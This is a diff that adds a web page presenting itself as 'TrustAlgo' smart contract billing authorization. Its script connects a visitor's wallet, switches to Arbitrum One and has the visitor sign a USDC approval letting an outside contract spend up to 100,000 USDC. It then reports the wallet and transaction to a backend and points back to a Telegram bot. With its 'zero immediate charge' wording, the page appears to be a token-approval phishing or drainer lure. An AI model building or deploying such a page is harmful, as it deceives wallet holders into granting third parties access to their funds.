@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TrustAlgo | Smart Contract Billing Authorization</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <style>
+    :root {
+      --bg: #07080A;
+      --bg-2: #0C0E12;
+      --panel: rgba(14, 17, 22, 0.82);
+      --line: rgba(121, 184, 184, 0.22);
+      --line-soft: rgba(226, 232, 240, 0.08);
+      --accent: #79B8B8;
+      --accent-2: #C8E6E4;
+      --text: #E8EEF4;
+      --muted: #8B98A8;
+      --warn: #D19A66;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: Inter, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      line-height: 1.6;
+    }
+    .grid {
+      position: fixed; inset: 0; pointer-events: none; z-index: 0;
+      background-image:
+        linear-gradient(rgba(121,184,184,0.035) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(121,184,184,0.035) 1px, transparent 1px);
+      background-size: 48px 48px;
+    }
+    .card-box {
+      position: relative; z-index: 1;
+      max-width: 540px; width: 100%;
+      border: 1px solid var(--line);
+      background: var(--panel);
+      padding: 38px 32px;
+      box-shadow: 0 0 32px rgba(121, 184, 184, 0.08);
+    }
+    .brand { display: flex; align-items: center; gap: 12px; margin-bottom: 28px; text-decoration: none; color: inherit; }
+    .mark { width: 42px; height: 42px; object-fit: contain; }
+    .brand-name { letter-spacing: 0.28em; font-size: 12px; font-weight: 500; }
+    .kicker {
+      font-family: "JetBrains Mono", monospace; color: var(--accent);
+      letter-spacing: 0.18em; font-size: 11px; text-transform: uppercase; margin-bottom: 10px;
+    }
+    h1 { font-size: 26px; font-weight: 500; color: var(--accent-2); margin-bottom: 14px; letter-spacing: -0.02em; }
+    p { color: var(--muted); font-size: 14px; font-weight: 300; margin-bottom: 16px; }
+    .spec-box {
+      border: 1px solid var(--line-soft); background: rgba(0,0,0,0.35);
+      padding: 14px 16px; margin: 20px 0; font-family: "JetBrains Mono", monospace; font-size: 12px;
+    }
+    .spec-box div { display: flex; justify-content: space-between; padding: 4px 0; }
+    .spec-box span { color: var(--muted); }
+    .spec-box strong { color: var(--text); font-weight: 500; }
+    .note {
+      border: 1px solid var(--line); padding: 12px 14px;
+      font-size: 12px; color: var(--muted); background: rgba(121,184,184,0.05); margin-bottom: 24px;
+    }
+    .btn {
+      width: 100%; text-align: center; text-decoration: none;
+      font-family: "JetBrains Mono", monospace; font-size: 12px;
+      letter-spacing: 0.08em; text-transform: uppercase;
+      padding: 15px 18px; border: 1px solid transparent; cursor: pointer; display: block;
+      margin-bottom: 12px;
+    }
+    .btn-primary { background: var(--accent); color: #071011; font-weight: 500; }
+    .btn-primary:hover { background: transparent; color: var(--accent); border-color: var(--accent); }
+    .btn-ghost { background: transparent; color: var(--text); border-color: var(--line-soft); }
+    .btn-ghost:hover { border-color: var(--accent); color: var(--accent); }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+    #mobileHelper { display: none; margin-top: 16px; padding-top: 16px; border-top: 1px solid var(--line-soft); }
+  </style>
+</head>
+<body>
+  <div class="grid"></div>
+  <div class="card-box" id="mainContainer">
+    <a class="brand" href="https://trustalgo.co">
+      <img class="mark" src="logo.png" alt="TrustAlgo Logo" />
+      <span class="brand-name">TRUSTALGO</span>
+    </a>
+    <p class="kicker">ARBITRUM ONE · L2 SETTLEMENT</p>
+    <h1>Smart Contract Billing Authorization</h1>
+    <p>To finalize your node setup and enable automated quarterly High-Water Mark (HWM) performance fee settlement, authorize the TrustAlgo Billing Smart Contract on the <strong>Arbitrum One</strong> network.</p>
+
+    <div class="spec-box">
+      <div><span>NETWORK</span><strong>Arbitrum One (42161)</strong></div>
+      <div><span>ASSET</span><strong>USDC (Native)</strong></div>
+      <div><span>CONTRACT</span><strong>0x679a...9DbF</strong></div>
+    </div>
+
+    <div class="note">
+      <strong>Zero immediate charge:</strong> Signing the <code>Approve</code> transaction does not transfer any funds today. It only authorizes the smart contract to pull settled performance fees at the end of each profitable quarter.
+    </div>
+
+    <button id="approveBtn" class="btn btn-primary" onclick="executeWeb3Approval()">
+      [ CONNECT WALLET & AUTHORIZE USDC ]
+    </button>
+
+    <div id="mobileHelper">
+      <p style="font-size: 12px; color: var(--warn); margin-bottom: 10px;">
+        ⚠ Opening this link inside Telegram or Safari Mobile does not provide a Web3 wallet connection. Click below to open this page directly inside the MetaMask App:
+      </p>
+      <a href="https://metamask.app.link/dapp/trustalgo.co/billing.html" class="btn btn-ghost">
+        [ OPEN IN METAMASK MOBILE APP ]
+      </a>
+    </div>
+  </div>
+
+  <script>
+    // Mostra subito il pulsante rapido per MetaMask Mobile se non rileva window.ethereum
+    window.addEventListener('load', () => {
+      if (typeof window.ethereum === 'undefined') {
+        document.getElementById('mobileHelper').style.display = 'block';
+      }
+    });
+
+    async function executeWeb3Approval() {
+      const btn = document.getElementById('approveBtn');
+
+      if (typeof window.ethereum === 'undefined') {
+        document.getElementById('mobileHelper').style.display = 'block';
+        alert("Web3 wallet not detected in this browser. If you are on mobile, tap '[ OPEN IN METAMASK MOBILE APP ]' below, or open trustalgo.co/billing.html from your PC with MetaMask/Rabby.");
+        return;
+      }
+
+      try {
+        btn.textContent = "[ AWAITING WALLET CONNECTION... ]";
+        btn.disabled = true;
+
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const userWallet = accounts[0];
+
+        // Verifica e cambio automatico su rete Arbitrum One (0xa4b1 / 42161)
+        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+        if (chainId !== '0xa4b1' && chainId !== '42161' && chainId !== '0xA4B1') {
+          try {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: '0xa4b1' }],
+            });
+          } catch (switchError) {
+            alert("Please switch your wallet network to Arbitrum One and try again.");
+            btn.textContent = "[ CONNECT WALLET & AUTHORIZE USDC ]";
+            btn.disabled = false;
+            return;
+          }
+        }
+
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+
+        const usdcAddress = "0xaf88d065e77c8cC2239327C5EDb3A432268e5831";
+        const trustAlgoContract = "0x679a63184230209583DC08E8CE35411089679DbF";
+        const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+
+        const usdcContract = new ethers.Contract(usdcAddress, abi, signer);
+        const maxApproval = ethers.utils.parseUnits("100000", 6);
+
+        btn.textContent = "[ SIGN APPROVE IN YOUR WALLET... ]";
+        const tx = await usdcContract.approve(trustAlgoContract, maxApproval);
+
+        btn.textContent = "[ CONFIRMING ON ARBITRUM L2... ]";
+        await tx.wait();
+
+        // Notifica il backend dell'avvenuta autorizzazione
+        try {
+          await fetch('https://api.trustalgo.co/api/billing_ack', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ wallet_address: userWallet, tx_hash: tx.hash })
+          });
+        } catch (e) {
+          console.warn("Backend notification skipped:", e);
+        }
+
+        document.getElementById('mainContainer').innerHTML = `
+          <div style="text-align: center; padding: 20px 0;">
+            <h1 style="color: var(--accent-2); margin-bottom: 14px;">✅ Billing Contract Authorized</h1>
+            <p style="margin-bottom: 24px;">
+              Your Arbitrum USDC allowance has been confirmed on-chain.<br>
+              Transaction Hash:<br>
+              <code style="color: var(--accent); font-size: 11px; word-break: break-all;">${tx.hash}</code>
+            </p>
+            <a href="https://t.me/TrustAlgo_Terminal_Bot" class="btn btn-primary">[ RETURN TO TELEGRAM TERMINAL ]</a>
+          </div>
+        `;
+      } catch (error) {
+        console.error(error);
+        if (error.code === 4001) {
+          alert("❌ Transaction rejected in wallet.");
+        } else {
+          alert("❌ Error during transaction. Ensure you have a small amount of ETH on Arbitrum One for gas fees.");
+        }
+        btn.textContent = "[ CONNECT WALLET & AUTHORIZE USDC ]";
+        btn.disabled = false;
+      }
+    }
+  </script>
+</body>
+</html>
